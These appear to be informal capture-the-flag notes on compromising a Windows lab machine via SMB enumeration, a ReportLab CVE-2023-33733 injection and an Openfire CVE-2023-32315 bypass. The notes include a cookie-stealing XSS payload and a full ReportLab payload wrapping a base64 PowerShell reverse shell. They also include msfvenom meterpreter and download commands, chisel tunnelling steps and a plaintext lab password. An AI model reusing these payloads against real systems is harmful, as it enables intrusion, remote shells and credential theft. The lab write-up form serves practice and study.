## Windows Machine Medium

-[+] : Target IP  10.10.11.16

## Recon

PORT    STATE SERVICE       VERSION
80/tcp  open  http          nginx 1.24.0
|_http-server-header: nginx/1.24.0
|_http-title: Did not follow redirect to http://solarlab.htb/
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?

## Port 80

-[+] : Contact form no xss

## SMB showed 
-[+] : smbclient -N -L //10.10.11.16


-[+] : smbclient //10.10.11.16/Documents
Password for [WORKGROUP\parrot]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sun May 12 21:34:38 2024
  ..                                 DR        0  Sun May 12 21:34:38 2024
  chisel.exe                          A  9006080  Sun May 12 21:34:52 2024
  concepts                            D        0  Fri Apr 26 15:41:57 2024
  desktop.ini                       AHS      278  Fri Nov 17 10:54:43 2023
  details-file.xlsx                   A    12793  Fri Nov 17 12:27:21 2023
  My Music                        DHSrn        0  Thu Nov 16 19:36:51 2023
  My Pictures                     DHSrn        0  Thu Nov 16 19:36:51 2023
  My Videos                       DHSrn        0  Thu Nov 16 19:36:51 2023
  old_leave_request_form.docx         A    37194  Fri Nov 17 10:35:57 2023


-[+] : smbclient //10.10.11.16/IPC$

-[1] : I can connect to it but nothing on it , so imma read /Documents share after full recon 

## Nmap full scan shows - Port 6791  - Open - HLM

-[+] : No default username password found no original platform of 6791 found linked to reporthub 

-[+] : can't bruteforce site goes down just after dirbusting 

-[+] : No xss in contact form for some stolen cookied , checked again 

<img src=x onerror=fetch("http://10.10.14.39:8001"+document.cookie);>
## Dev password on port 6791 

-[+] : details-file.xlsx  -> AlexanderK is a valid user so I figured its same structure for other users -> BlakeB:ThisCanB3typedeasily1@

## Foothold

-[+] : So now we have some foothold , let's do recon on reporthub .

### Recon-Foothold
-[+] : Playing with burpsuite showed that website works with reportlab pdf 1.4 for pdf . 
		Google Query: "PDF-1.4 reportlab exploit"
		
		CVE-2023-33733

-[+] : Also 500 internal server error multuple times . Trying to inject malicious inputs in user fields . 

-[1] : In CVE-2023-33733 found that I disguise malicious code into an .html file that would be read .
-[-] : It took alot of time to showcase internal server error maybe could put reverse shell in it .
-[-] : I stopped trying to inject malicious code into .png since i can do it without it in any data-form .

-[+] : got revshell working with powershell   

```payload
		<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwA5ACIALAAxADIAMwA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">
				exploit
		</font></para>
```

## User Recon :

-[+] : Again to recon through user 

By the way you need to revise upgrading windows shell through metasploit again 

		msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.39 LPORT=4444 -f exe -o reverse.exe

		Invoke-WebRequest -Uri http://10.10.14.39:8002/reverse.exe -UseBasicParsing -o reverse.exe

-[+] : Enumerating all accessible desktops

Desktops
========

    Session  Station           Name
    -------  -------           ----
    0        msswindowstation  mssrestricteddesk

-[+] : netstat -a showed openfire-service.exe running on pid 2200 on multiple ports 

		Google Query:openfire-service port http
		
		Admin Console Access:
		Port 9090: Unsecured Admin Console access.
		Port 8443: Secured Admin Console access.

-[+] : Chisel port 9090

Chisel on windows build .exe : 
```parrot
	sudo GOOS=windows GOARCH=amd64 go build main.go
```

		chisel on blake :
		main.exe client http://10.10.14.39:3636 R:9090:127.0.0.1:9090
		chisel on attacker
		./chisel server --reverse  --port 3636

		Administration Console authentication bypass in openfire xmppserver

		just follow the https://github.com/miko550/CVE-2023-32315

User added successfully: url: http://127.0.0.1:9090 username: p25z5k password: knblk3

Follow the git to leverage to openfire user through powershell revshell again 

PS C:\Program Files\Openfire\embedded-db> cat openfire.script -> contains some passwords ... Im done 4 today 




		
 



